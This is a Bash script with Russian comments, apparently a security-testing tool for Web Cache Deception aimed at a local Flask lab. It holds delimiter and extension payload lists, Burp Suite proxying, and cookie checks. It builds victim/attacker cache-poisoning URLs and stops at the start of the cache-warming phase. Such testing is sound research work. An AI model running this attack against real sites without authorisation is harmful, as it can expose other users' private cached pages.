#!/bin/bash
# =============================================================================
# wcd_gun.sh — Пулемёт для тестирования Web Cache Deception v7.8
# =============================================================================
# Назначение:
#   - Двухфазный обстрел: прогрев кэша (жертва) → проверка (атакующий)
#   - Одиночные выстрелы с гибкими аргументами:
#       single [разделитель] [расширение]
#       quick  [разделитель] [расширение]
#       show   [разделитель] [расширение]
#     Если аргумент опущен, используется первый элемент соответствующей обоймы.
#     Специальное значение "none" отключает параметр (пустой разделитель/расширение).
#   - Прямой запрос к произвольному URL через команду raw
#   - Поддержка проксирования через Burp Suite (порт 8082)
#   - Проверка доступности Burp Suite перед началом работы
#   - ЧЕСТНОЕ отображение: с кукой или без
#   - Полные проверки всех параметров
#   - Подробные пояснения каждого шага в консоли
#   - Управление обоймами: добавление/удаление разделителей и расширений
#   - Логирование всех действий в файл рядом с исходным скриптом
#   - Команда load для быстрой загрузки обойм (разделители + расширения)
# =============================================================================

# -----------------------------------------------------------------------------
# ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
# -----------------------------------------------------------------------------

# ЖЁСТКИЙ ПУТЬ к исходной директории проекта (где физически лежит пулемёт)
PROJECT_TOOLS_DIR="$HOME/BB/CORE-SWIGGER/wcd_flask_test/tools"

# Логи хранятся в исходной папке с пулемётом
LOG_FILE="$PROJECT_TOOLS_DIR/wcd_gun.log"

# Обоймы хранятся в исходной папке с пулемётом в подпапке magazines
MAGAZINE_DIR="$PROJECT_TOOLS_DIR/magazines"

# Цель атаки (базовый URL, например http://127.0.0.1:8080/profile)
TARGET=""

# Кука для аутентификации (например session=valid)
COOKIE=""

# Массив разделителей, используемых при формировании векторов атаки
DELIMITERS=(";" "." "?" "%00" "%23" "%3F" "%0A" "%09" "%20")

# Массив статических расширений, которые пытаемся добавить к URL
EXTENSIONS=(".css" ".js" ".jpg" ".ico")

# Настройки прокси для интеграции с Burp Suite
BURP_HOST="127.0.0.1"
BURP_PORT="8082"
USE_PROXY=false                     # Флаг использования прокси
PROXY_STRING=""                     # Строка с параметрами прокси для curl

# -----------------------------------------------------------------------------
# ЦВЕТА ДЛЯ ВЫВОДА В КОНСОЛЬ
# -----------------------------------------------------------------------------
# ANSI escape-последовательности для цветного вывода
RED='\033[0;31m'        # Красный - ошибки, уязвимости
GREEN='\033[0;32m'      # Зелёный - успех, защита
YELLOW='\033[1;33m'     # Жёлтый - предупреждения, информация
BLUE='\033[0;34m'       # Синий - нейтральная информация
CYAN='\033[0;36m'       # Голубой - заголовки, рамки
MAGENTA='\033[0;35m'    # Пурпурный - фазы атаки
WHITE='\033[1;37m'      # Белый - выделение важного
NC='\033[0m'            # No Color - сброс цвета

# =============================================================================
# ЛОГИРОВАНИЕ
# =============================================================================
# Функция для записи событий в лог-файл
# Аргументы:
#   $1 - уровень события (INFO, ERROR, WARN, VULN, SHOT, FIRE, RAW, START, STOP)
#   $2 - сообщение
#   $3 - дополнительные детали (опционально)
log_event() {
    local level="$1"
    local message="$2"
    local details="$3"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Убеждаемся, что директория для лога существует
    mkdir -p "$PROJECT_TOOLS_DIR" 2>/dev/null
    
    # Записываем основное сообщение
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
    
    # Если есть детали - записываем их с отступом
    if [[ -n "$details" ]]; then
        echo "    $details" >> "$LOG_FILE"
    fi
}

# =============================================================================
# ИНИЦИАЛИЗАЦИЯ ДИРЕКТОРИИ ДЛЯ ОБОЙМ
# =============================================================================
# Создаёт директорию для хранения обойм, если она не существует
init_magazine_dir() {
    if [[ ! -d "$MAGAZINE_DIR" ]]; then
        mkdir -p "$MAGAZINE_DIR" 2>/dev/null
        if [[ -d "$MAGAZINE_DIR" ]]; then
            echo -e "${GREEN}[+] Создана директория для обойм: $MAGAZINE_DIR${NC}"
            log_event "INFO" "Создана директория обойм" "$MAGAZINE_DIR"
        else
            echo -e "${RED}[!] Не удалось создать директорию обойм: $MAGAZINE_DIR${NC}"
            log_event "ERROR" "Не удалось создать директорию обойм" "$MAGAZINE_DIR"
        fi
    fi
}

# =============================================================================
# СОХРАНЕНИЕ ОБОЙМЫ РАЗДЕЛИТЕЛЕЙ
# =============================================================================
# Сохраняет текущий массив DELIMITERS в файл
# Аргументы:
#   $1 - имя обоймы (будет создан файл имя.delimiters)
save_delimiters_magazine() {
    local magazine_name="$1"
    
    # Проверяем, что имя обоймы указано
    if [[ -z "$magazine_name" ]]; then
        echo -e "${RED}[!] Укажи имя обоймы${NC}"
        log_event "ERROR" "save_delimiters: не указано имя обоймы"
        return 1
    fi
    
    # Убеждаемся, что директория существует
    init_magazine_dir
    local file_path="$MAGAZINE_DIR/${magazine_name}.delimiters"
    
    # Записываем каждый разделитель на новой строке
    printf "%s\n" "${DELIMITERS[@]}" > "$file_path" 2>/dev/null
    
    # Проверяем успешность записи
    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] Обойма разделителей сохранена: $magazine_name${NC}"
        echo -e "${CYAN}    Файл: $file_path${NC}"
        echo -e "${CYAN}    Разделителей: ${#DELIMITERS[@]}${NC}"
        log_event "INFO" "Обойма разделителей сохранена" "$magazine_name (${#DELIMITERS[@]} разделителей) -> $file_path"
    else
        echo -e "${RED}[!] Ошибка при сохранении обоймы${NC}"
        log_event "ERROR" "Ошибка сохранения обоймы разделителей" "$magazine_name -> $file_path"
    fi
}

# =============================================================================
# ЗАГРУЗКА ОБОЙМЫ РАЗДЕЛИТЕЛЕЙ
# =============================================================================
# Загружает разделители из файла, ЗАМЕНЯЯ текущий массив DELIMITERS
# Аргументы:
#   $1 - имя обоймы (файл имя.delimiters)
load_delimiters_magazine() {
    local magazine_name="$1"
    
    # Проверяем, что имя обоймы указано
    if [[ -z "$magazine_name" ]]; then
        echo -e "${RED}[!] Укажи имя обоймы${NC}"
        log_event "ERROR" "load_delimiters: не указано имя обоймы"
        return 1
    fi
    
    local file_path="$MAGAZINE_DIR/${magazine_name}.delimiters"
    
    # Проверяем существование файла
    if [[ ! -f "$file_path" ]]; then
        echo -e "${RED}[!] Обойма не найдена: $magazine_name${NC}"
        echo -e "${YELLOW}[*] Доступные обоймы разделителей:${NC}"
        list_delimiters_magazines
        log_event "ERROR" "Обойма разделителей не найдена" "$magazine_name -> $file_path"
        return 1
    fi
    
    # Загружаем содержимое файла в массив
    mapfile -t DELIMITERS < "$file_path" 2>/dev/null
    
    echo -e "${GREEN}[+] Обойма разделителей загружена: $magazine_name${NC}"
    echo -e "${CYAN}    Загружено разделителей: ${#DELIMITERS[@]}${NC}"
    log_event "INFO" "Обойма разделителей загружена" "$magazine_name (${#DELIMITERS[@]} разделителей) из $file_path"
    show_delimiters
}

# =============================================================================
# СПИСОК ОБОЙМ РАЗДЕЛИТЕЛЕЙ
# =============================================================================
# Показывает все сохранённые обоймы разделителей
list_delimiters_magazines() {
    init_magazine_dir
    
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}📦 ОБОЙМЫ РАЗДЕЛИТЕЛЕЙ${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    
    local found=0
    
    # Перебираем все файлы с расширением .delimiters
    for mag in "$MAGAZINE_DIR"/*.delimiters; do
        if [[ -f "$mag" ]]; then
            local name=$(basename "$mag" .delimiters)
            local count=$(wc -l < "$mag" 2>/dev/null | tr -d ' ')
            echo -e "  ${GREEN}•${NC} $name ${CYAN}($count разделителей)${NC}"
            found=1
        fi
    done 2>/dev/null
    
    # Если ничего не найдено
    if [[ $found -eq 0 ]]; then
        echo -e "${YELLOW}  Нет сохранённых обойм${NC}"
    fi
    
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    log_event "INFO" "Показан список обойм разделителей" "Найдено: $found"
}

# =============================================================================
# УДАЛЕНИЕ ОБОЙМЫ РАЗДЕЛИТЕЛЕЙ
# =============================================================================
# Удаляет сохранённую обойму разделителей
# Аргументы:
#   $1 - имя обоймы для удаления
delete_delimiters_magazine() {
    local magazine_name="$1"
    
    # Проверяем, что имя обоймы указано
    if [[ -z "$magazine_name" ]]; then
        echo -e "${RED}[!] Укажи имя обоймы${NC}"
        log_event "ERROR" "delete_delimiters: не указано имя обоймы"
        return 1
    fi
    
    local file_path="$MAGAZINE_DIR/${magazine_name}.delimiters"
    
    # Проверяем существование файла
    if [[ ! -f "$file_path" ]]; then
        echo -e "${RED}[!] Обойма не найдена: $magazine_name${NC}"
        log_event "ERROR" "Обойма разделителей не найдена для удаления" "$magazine_name"
        return 1
    fi
    
    # Удаляем файл
    rm "$file_path" 2>/dev/null
    
    if [[ $? -eq 0 ]]; then
        echo -e "${YELLOW}[-] Обойма удалена: $magazine_name${NC}"
        log_event "INFO" "Обойма разделителей удалена" "$magazine_name -> $file_path"
    else
        echo -e "${RED}[!] Ошибка при удалении обоймы${NC}"
        log_event "ERROR" "Ошибка удаления обоймы разделителей" "$magazine_name"
    fi
}

# =============================================================================
# СОХРАНЕНИЕ ОБОЙМЫ РАСШИРЕНИЙ
# =============================================================================
# Сохраняет текущий массив EXTENSIONS в файл
# Аргументы:
#   $1 - имя обоймы (будет создан файл имя.extensions)
save_extensions_magazine() {
    local magazine_name="$1"
    
    # Проверяем, что имя обоймы указано
    if [[ -z "$magazine_name" ]]; then
        echo -e "${RED}[!] Укажи имя обоймы${NC}"
        log_event "ERROR" "save_extensions: не указано имя обоймы"
        return 1
    fi
    
    # Убеждаемся, что директория существует
    init_magazine_dir
    local file_path="$MAGAZINE_DIR/${magazine_name}.extensions"
    
    # Записываем каждое расширение на новой строке
    printf "%s\n" "${EXTENSIONS[@]}" > "$file_path" 2>/dev/null
    
    # Проверяем успешность записи
    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] Обойма расширений сохранена: $magazine_name${NC}"
        echo -e "${CYAN}    Файл: $file_path${NC}"
        echo -e "${CYAN}    Расширений: ${#EXTENSIONS[@]}${NC}"
        log_event "INFO" "Обойма расширений сохранена" "$magazine_name (${#EXTENSIONS[@]} расширений) -> $file_path"
    else
        echo -e "${RED}[!] Ошибка при сохранении обоймы${NC}"
        log_event "ERROR" "Ошибка сохранения обоймы расширений" "$magazine_name -> $file_path"
    fi
}

# =============================================================================
# ЗАГРУЗКА ОБОЙМЫ РАСШИРЕНИЙ
# =============================================================================
# Загружает расширения из файла, ЗАМЕНЯЯ текущий массив EXTENSIONS
# Аргументы:
#   $1 - имя обоймы (файл имя.extensions)
load_extensions_magazine() {
    local magazine_name="$1"
    
    # Проверяем, что имя обоймы указано
    if [[ -z "$magazine_name" ]]; then
        echo -e "${RED}[!] Укажи имя обоймы${NC}"
        log_event "ERROR" "load_extensions: не указано имя обоймы"
        return 1
    fi
    
    local file_path="$MAGAZINE_DIR/${magazine_name}.extensions"
    
    # Проверяем существование файла
    if [[ ! -f "$file_path" ]]; then
        echo -e "${RED}[!] Обойма не найдена: $magazine_name${NC}"
        echo -e "${YELLOW}[*] Доступные обоймы расширений:${NC}"
        list_extensions_magazines
        log_event "ERROR" "Обойма расширений не найдена" "$magazine_name -> $file_path"
        return 1
    fi
    
    # Загружаем содержимое файла в массив
    mapfile -t EXTENSIONS < "$file_path" 2>/dev/null
    
    echo -e "${GREEN}[+] Обойма расширений загружена: $magazine_name${NC}"
    echo -e "${CYAN}    Загружено расширений: ${#EXTENSIONS[@]}${NC}"
    log_event "INFO" "Обойма расширений загружена" "$magazine_name (${#EXTENSIONS[@]} расширений) из $file_path"
    show_extensions
}

# =============================================================================
# СПИСОК ОБОЙМ РАСШИРЕНИЙ
# =============================================================================
# Показывает все сохранённые обоймы расширений
list_extensions_magazines() {
    init_magazine_dir
    
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}📦 ОБОЙМЫ РАСШИРЕНИЙ${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    
    local found=0
    
    # Перебираем все файлы с расширением .extensions
    for mag in "$MAGAZINE_DIR"/*.extensions; do
        if [[ -f "$mag" ]]; then
            local name=$(basename "$mag" .extensions)
            local count=$(wc -l < "$mag" 2>/dev/null | tr -d ' ')
            echo -e "  ${GREEN}•${NC} $name ${CYAN}($count расширений)${NC}"
            found=1
        fi
    done 2>/dev/null
    
    # Если ничего не найдено
    if [[ $found -eq 0 ]]; then
        echo -e "${YELLOW}  Нет сохранённых обойм${NC}"
    fi
    
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    log_event "INFO" "Показан список обойм расширений" "Найдено: $found"
}

# =============================================================================
# УДАЛЕНИЕ ОБОЙМЫ РАСШИРЕНИЙ
# =============================================================================
# Удаляет сохранённую обойму расширений
# Аргументы:
#   $1 - имя обоймы для удаления
delete_extensions_magazine() {
    local magazine_name="$1"
    
    # Проверяем, что имя обоймы указано
    if [[ -z "$magazine_name" ]]; then
        echo -e "${RED}[!] Укажи имя обоймы${NC}"
        log_event "ERROR" "delete_extensions: не указано имя обоймы"
        return 1
    fi
    
    local file_path="$MAGAZINE_DIR/${magazine_name}.extensions"
    
    # Проверяем существование файла
    if [[ ! -f "$file_path" ]]; then
        echo -e "${RED}[!] Обойма не найдена: $magazine_name${NC}"
        log_event "ERROR" "Обойма расширений не найдена для удаления" "$magazine_name"
        return 1
    fi
    
    # Удаляем файл
    rm "$file_path" 2>/dev/null
    
    if [[ $? -eq 0 ]]; then
        echo -e "${YELLOW}[-] Обойма удалена: $magazine_name${NC}"
        log_event "INFO" "Обойма расширений удалена" "$magazine_name -> $file_path"
    else
        echo -e "${RED}[!] Ошибка при удалении обоймы${NC}"
        log_event "ERROR" "Ошибка удаления обоймы расширений" "$magazine_name"
    fi
}

# =============================================================================
# ПРОВЕРКА ДОСТУПНОСТИ BURP SUITE
# =============================================================================
# Проверяет, запущен ли Burp Suite и слушает ли он на BURP_HOST:BURP_PORT
# Возвращает 0 если доступен, 1 если нет
check_burp() {
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ ПРОВЕРКА BURP SUITE                                         │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "${YELLOW}[*] Проверяю доступность Burp Suite на ${BURP_HOST}:${BURP_PORT}...${NC}"
    
    # Проверяем наличие netcat для проверки порта
    if command -v nc &>/dev/null; then
        # Пытаемся подключиться к порту
        if nc -z "$BURP_HOST" "$BURP_PORT" 2>/dev/null; then
            echo -e "${GREEN}[+] Burp Suite доступен на ${BURP_HOST}:${BURP_PORT}${NC}"
            
            # Дополнительная проверка - тестовый запрос через прокси
            local test_response=$(curl -s -o /dev/null -w "%{http_code}" --proxy "http://${BURP_HOST}:${BURP_PORT}" "http://detectportal.firefox.com/success.txt" 2>/dev/null | tr -d '"')
            
            if [[ "$test_response" == "200" ]]; then
                echo -e "${GREEN}[+] Прокси работает корректно (тестовый запрос прошёл)${NC}"
                log_event "INFO" "Burp Suite доступен и работает" "${BURP_HOST}:${BURP_PORT}"
                return 0
            else
                echo -e "${YELLOW}[!] Порт открыт, но прокси не отвечает (HTTP $test_response)${NC}"
                log_event "WARN" "Burp порт открыт, но прокси не отвечает" "HTTP $test_response"
                return 1
            fi
        else
            echo -e "${RED}[!] Burp Suite НЕ ДОСТУПЕН на ${BURP_HOST}:${BURP_PORT}${NC}"
            log_event "ERROR" "Burp Suite недоступен" "${BURP_HOST}:${BURP_PORT}"
            return 1
        fi
    else
        # Если netcat отсутствует, используем только curl
        local test_response=$(curl -s -o /dev/null -w "%{http_code}" --proxy "http://${BURP_HOST}:${BURP_PORT}" "http://detectportal.firefox.com/success.txt" 2>/dev/null | tr -d '"')
        
        if [[ "$test_response" == "200" ]]; then
            echo -e "${GREEN}[+] Burp Suite доступен и работает${NC}"
            log_event "INFO" "Burp Suite доступен (curl test)" "${BURP_HOST}:${BURP_PORT}"
            return 0
        else
            echo -e "${RED}[!] Не удалось проверить Burp Suite (curl вернул $test_response)${NC}"
            log_event "ERROR" "Burp Suite не отвечает через curl" "HTTP $test_response"
            return 1
        fi
    fi
}

# =============================================================================
# ЗАПУСК BURP SUITE (если не запущен)
# =============================================================================
# Пытается автоматически запустить Burp Suite, если он не запущен
# Возвращает 0 если запущен успешно, 1 если не удалось
launch_burp() {
    echo ""
    echo -e "${YELLOW}[?] Burp Suite не запущен. Запустить его? (y/n)${NC}"
    read -p "> " choice
    
    if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
        echo -e "${CYAN}[*] Пытаюсь запустить Burp Suite...${NC}"
        log_event "INFO" "Попытка запуска Burp Suite"
        
        # Проверяем различные пути к исполняемому файлу Burp Suite
        if command -v burpsuite &>/dev/null; then
            burpsuite & 2>/dev/null
            echo -e "${GREEN}[+] Burp Suite запущен в фоне${NC}"
            log_event "INFO" "Burp Suite запущен через burpsuite"
        elif [[ -f "/usr/bin/burpsuite" ]]; then
            /usr/bin/burpsuite & 2>/dev/null
            echo -e "${GREEN}[+] Burp Suite запущен в фоне${NC}"
            log_event "INFO" "Burp Suite запущен из /usr/bin/burpsuite"
        elif [[ -f "/opt/BurpSuiteCommunity/BurpSuiteCommunity" ]]; then
            /opt/BurpSuiteCommunity/BurpSuiteCommunity & 2>/dev/null
            echo -e "${GREEN}[+] Burp Suite запущен в фоне${NC}"
            log_event "INFO" "Burp Suite запущен из /opt/BurpSuiteCommunity"
        else
            echo -e "${RED}[!] Не могу найти исполняемый файл Burp Suite${NC}"
            echo -e "${YELLOW}[*] Запусти Burp Suite вручную и нажми Enter${NC}"
            read -p ""
            log_event "WARN" "Burp Suite не найден, ожидание ручного запуска"
        fi
        
        echo -e "${CYAN}[*] Жду запуска Burp Suite (10 секунд)...${NC}"
        sleep 10
        
        # Проверяем, запустился ли Burp
        if check_burp; then
            return 0
        else
            echo -e "${RED}[!] Burp Suite всё ещё не отвечает${NC}"
            log_event "ERROR" "Burp Suite не ответил после ожидания"
            return 1
        fi
    else
        echo -e "${YELLOW}[*] Продолжаю БЕЗ проксирования${NC}"
        log_event "INFO" "Пользователь отказался от запуска Burp"
        return 1
    fi
}

# =============================================================================
# НАСТРОЙКА ПРОКСИ
# =============================================================================
# Запрашивает у пользователя, использовать ли проксирование через Burp Suite
# Устанавливает глобальные переменные USE_PROXY и PROXY_STRING
setup_proxy() {
    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ НАСТРОЙКА ПРОКСИРОВАНИЯ                                     │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "${YELLOW}[?] Использовать Burp Suite для проксирования трафика? (y/n)${NC}"
    echo -e "${CYAN}    Это позволит видеть все запросы в Burp → HTTP History${NC}"
    read -p "> " choice
    
    if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
        # Проверяем доступность Burp
        if check_burp; then
            USE_PROXY=true
            PROXY_STRING="--proxy http://${BURP_HOST}:${BURP_PORT}"
            echo -e "${GREEN}[+] Проксирование ВКЛЮЧЕНО: ${BURP_HOST}:${BURP_PORT}${NC}"
            log_event "INFO" "Проксирование включено" "${BURP_HOST}:${BURP_PORT}"
        else
            # Пытаемся запустить Burp
            if launch_burp; then
                USE_PROXY=true
                PROXY_STRING="--proxy http://${BURP_HOST}:${BURP_PORT}"
                echo -e "${GREEN}[+] Проксирование ВКЛЮЧЕНО: ${BURP_HOST}:${BURP_PORT}${NC}"
                log_event "INFO" "Проксирование включено после запуска Burp" "${BURP_HOST}:${BURP_PORT}"
            else
                USE_PROXY=false
                PROXY_STRING=""
                echo -e "${YELLOW}[*] Проксирование ОТКЛЮЧЕНО${NC}"
                log_event "WARN" "Проксирование отключено (Burp недоступен)"
            fi
        fi
    else
        USE_PROXY=false
        PROXY_STRING=""
        echo -e "${YELLOW}[*] Проксирование ОТКЛЮЧЕНО${NC}"
        log_event "INFO" "Проксирование отключено пользователем"
    fi
}

# =============================================================================
# ВЫПОЛНЕНИЕ CURL ЗАПРОСА
# =============================================================================
# Обёртка для curl, которая автоматически добавляет прокси если USE_PROXY=true
# Аргументы:
#   $1 - URL для запроса
#   $2 - дополнительные опции curl (-i, -s, -I, -b и т.д.)
do_curl() {
    local url="$1"
    local options="$2"
    
    # Для HTTPS запросов добавляем флаг -k (игнорировать ошибки сертификата)
    if [[ "$url" == https://* ]]; then
        if [[ -n "$PROXY_STRING" ]]; then
            curl -k $PROXY_STRING $options "$url" 2>/dev/null
        else
            curl -k $options "$url" 2>/dev/null
        fi
    else
        # Для HTTP запросов
        if [[ -n "$PROXY_STRING" ]]; then
            curl $PROXY_STRING $options "$url" 2>/dev/null
        else
            curl $options "$url" 2>/dev/null
        fi
    fi
}

# =============================================================================
# БАННЕР
# =============================================================================
# Отображает красивый баннер с текущими настройками
banner() {
    clear 2>/dev/null || true
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}🔫 WCD GUN v7.8 — пулемёт для тестирования Web Cache Deception${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${GREEN}🎯 Target:${NC} ${TARGET:-НЕ ЗАДАН}"
    echo -e "  ${YELLOW}🍪 Cookie:${NC} ${COOKIE:-НЕ ЗАДАНА}"
    
    # Отображаем статус прокси
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "  ${MAGENTA}🔌 Proxy:${NC} ${BURP_HOST}:${BURP_PORT} ${GREEN}(Burp Suite)${NC}"
    else
        echo -e "  ${MAGENTA}🔌 Proxy:${NC} ${YELLOW}ОТКЛЮЧЕН${NC}"
    fi
    
    echo -e "  ${BLUE}📦 Разделителей:${NC} ${#DELIMITERS[@]}  ${BLUE}📦 Расширений:${NC} ${#EXTENSIONS[@]}"
    echo -e "  ${CYAN}📁 Обоймы:${NC} $MAGAZINE_DIR"
    echo -e "  ${CYAN}📋 Лог:${NC} $LOG_FILE"
    echo ""
}

# =============================================================================
# ПРОВЕРКА ДОСТУПНОСТИ ЦЕЛИ
# =============================================================================
# Проверяет, отвечает ли целевой URL
# Аргументы:
#   $1 - URL для проверки (если не указан, используется TARGET)
check_target() {
    local url="${1:-$TARGET}"
    
    # Проверяем, что URL задан
    if [[ -z "$url" ]]; then
        echo -e "${RED}[!] ОШИБКА: Цель не задана. Используй set target <URL>${NC}"
        log_event "ERROR" "check_target: цель не задана"
        return 1
    fi
    
    echo -e "${YELLOW}[*] ПРОВЕРКА: Стучусь по адресу $url ...${NC}"
    
    # Делаем HEAD-запрос и проверяем HTTP-код
    local http_code=$(do_curl "$url" "-s -o /dev/null -w \"%{http_code}\"" | tr -d '"')
    
    # Считаем доступными коды 200, 302, 301, 401, 403
    if [[ "$http_code" =~ ^(200|302|301|401|403)$ ]]; then
        echo -e "${GREEN}[+] УСПЕХ: Цель доступна (HTTP $http_code)${NC}"
        log_event "INFO" "Цель доступна" "$url (HTTP $http_code)"
        return 0
    else
        echo -e "${RED}[!] ОШИБКА: Цель недоступна или вернула HTTP $http_code${NC}"
        log_event "ERROR" "Цель недоступна" "$url (HTTP $http_code)"
        return 1
    fi
}

# =============================================================================
# ПРОВЕРКА КУКИ
# =============================================================================
# Проверяет валидность куки на целевом URL
# Возвращает 0 если кука валидна (HTTP 200), 1 если нет
validate_cookie() {
    # Если кука не задана - невалидна
    if [[ -z "$COOKIE" ]]; then
        log_event "INFO" "validate_cookie: кука не задана"
        return 1
    fi
    
    echo -e "${YELLOW}[*] ПРОВЕРКА КУКИ: Тестирую $COOKIE на $TARGET ...${NC}"
    
    # Делаем запрос с кукой и получаем заголовки
    local test_response=$(do_curl "$TARGET" "-s -I -b \"$COOKIE\"")
    local http_code=$(echo "$test_response" | head -1 | awk '{print $2}' | tr -d '\r\n')
    
    if [[ "$http_code" == "200" ]]; then
        echo -e "${GREEN}[+] КУКА ВАЛИДНА: Доступ к $TARGET разрешён (HTTP 200)${NC}"
        log_event "INFO" "Кука валидна" "$COOKIE -> HTTP 200"
        return 0
    elif [[ "$http_code" == "302" ]] || [[ "$http_code" == "301" ]]; then
        # Редирект - кука не даёт прямой доступ
        local location=$(echo "$test_response" | grep -i "^Location:" | awk '{print $2}' | tr -d '\r')
        echo -e "${YELLOW}[!] ПРЕДУПРЕЖДЕНИЕ: Кука ведёт на редирект ($location)${NC}"
        log_event "WARN" "Кука вызывает редирект" "Location: $location"
        return 1
    else
        echo -e "${RED}[!] ОШИБКА: С кукой получен HTTP $http_code${NC}"
        log_event "ERROR" "Кука невалидна" "$COOKIE -> HTTP $http_code"
        return 1
    fi
}

# =============================================================================
# ПРЯМОЙ ЗАПРОС (RAW)
# =============================================================================
# Выполняет прямой curl-запрос к произвольному URL
# Автоматически использует прокси, если он включен
# Аргументы:
#   $1 - полный URL для запроса
raw_request() {
    local url="$1"
    
    # Проверяем, что URL передан
    if [[ -z "$url" ]]; then
        echo -e "${RED}[!] Укажи URL для запроса${NC}"
        echo -e "${YELLOW}[*] Пример: raw http://127.0.0.1:8080/profile${NC}"
        log_event "ERROR" "raw_request: URL не указан"
        return 1
    fi
    
    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ 🌐 ПРЯМОЙ ЗАПРОС                                             │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "${CYAN}[*] URL: ${WHITE}$url${NC}"
    
    # Отображаем статус прокси
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "${CYAN}[*] Прокси: ${GREEN}ВКЛЮЧЕН${NC} (${BURP_HOST}:${BURP_PORT})${NC}"
    else
        echo -e "${CYAN}[*] Прокси: ${YELLOW}ОТКЛЮЧЕН${NC}"
    fi
    
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    
    # Выполняем запрос с опцией -i (показать заголовки)
    do_curl "$url" "-i"
    
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Логируем действие
    log_event "RAW" "Прямой запрос" "$url"
}

# =============================================================================
# ОДИНОЧНЫЙ ВЫСТРЕЛ (полный цикл: прогрев + проверка)
# =============================================================================
# Выполняет двухфазную атаку для одного вектора (разделитель + расширение)
# Аргументы (опциональные):
#   $1 - разделитель (если не указан, берётся первый из DELIMITERS)
#   $2 - расширение (если не указано, берётся первое из EXTENSIONS)
# Специальное значение "none" отключает параметр
single_shot() {
    local delim="$1"
    local ext="$2"

    # ===== ОБРАБОТКА РАЗДЕЛИТЕЛЯ =====
    if [[ -z "$delim" ]]; then
        # Разделитель не указан - берём первый из обоймы
        if [[ ${#DELIMITERS[@]} -gt 0 ]]; then
            delim="${DELIMITERS[0]}"
            echo -e "${YELLOW}[*] Разделитель не указан, использую первый из обоймы: '$delim'${NC}"
        else
            # Обойма пуста - ошибка
            echo -e "${RED}[!] Обойма разделителей пуста, а разделитель не указан.${NC}"
            echo -e "${YELLOW}[*] Используйте 'add <разделитель>' для добавления.${NC}"
            log_event "ERROR" "single_shot: обойма разделителей пуста"
            return 1
        fi
    elif [[ "$delim" == "none" ]]; then
        # Явное отключение разделителя
        delim=""
        echo -e "${YELLOW}[*] Разделитель отключен (none)${NC}"
    fi

    # ===== ОБРАБОТКА РАСШИРЕНИЯ =====
    if [[ -z "$ext" ]]; then
        # Расширение не указано - берём первое из обоймы
        if [[ ${#EXTENSIONS[@]} -gt 0 ]]; then
            ext="${EXTENSIONS[0]}"
            echo -e "${YELLOW}[*] Расширение не указано, использую первое из обоймы: '$ext'${NC}"
        else
            # Обойма пуста - ошибка
            echo -e "${RED}[!] Обойма расширений пуста, а расширение не указано.${NC}"
            echo -e "${YELLOW}[*] Используйте 'addext <расширение>' для добавления.${NC}"
            log_event "ERROR" "single_shot: обойма расширений пуста"
            return 1
        fi
    elif [[ "$ext" == "none" ]]; then
        # Явное отключение расширения
        ext=""
        echo -e "${YELLOW}[*] Расширение отключено (none)${NC}"
    fi

    # Добавляем точку к расширению, если оно не пустое и не начинается с точки
    if [[ -n "$ext" && "$ext" != .* ]]; then
        ext=".$ext"
    fi

    # Проверяем доступность цели
    if ! check_target; then
        return 1
    fi

    # ===== ФОРМИРОВАНИЕ URL ВЕКТОРА =====
    local attack_url
    if [[ -n "$delim" ]]; then
        # С разделителем: TARGET + delim + test + ext
        attack_url="${TARGET}${delim}test${ext}"
    else
        # Без разделителя: TARGET + test + ext
        attack_url="${TARGET}test${ext}"
    fi

    # ===== ОТОБРАЖЕНИЕ ИНФОРМАЦИИ О ВЫСТРЕЛЕ =====
    echo ""
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  🔫 ОДИНОЧНЫЙ ВЫСТРЕЛ                                         ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ ЦЕЛЬ: ${WHITE}$attack_url${NC}"
    echo -e "${CYAN}│ РАЗДЕЛИТЕЛЬ: ${WHITE}${delim:-<нет>}${NC}"
    echo -e "${CYAN}│ РАСШИРЕНИЕ: ${WHITE}${ext:-<нет>}${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    log_event "SHOT" "Одиночный выстрел" "URL: $attack_url, delim: ${delim:-none}, ext: ${ext:-none}"

    # ===== ФАЗА 1: ПРОГРЕВ КЭША =====
    echo -e "${YELLOW}[*] ФАЗА 1: ПРОГРЕВ КЭША${NC}"
    echo -e "${CYAN}    Отправляю запрос для прогрева кэша...${NC}"

